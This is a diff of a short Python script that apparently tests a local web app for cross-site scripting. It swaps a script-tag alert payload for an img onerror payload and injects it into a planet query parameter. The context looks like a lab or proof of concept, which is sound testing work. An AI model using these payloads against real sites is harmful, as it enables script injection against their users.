@@ -4,7 +4,7 @@ import requests
 target_url = "http://localhost:5000/"
 
 # XSS payload
-payload = "<script>alert(document.cookies)</script>"
+payload = "<<img src='x' onerror='alert(1)'>>"
 
 # Craft the malicious URL with the payload
 malicious_url = f"{target_url}getPlanetInfo?planet={payload}"
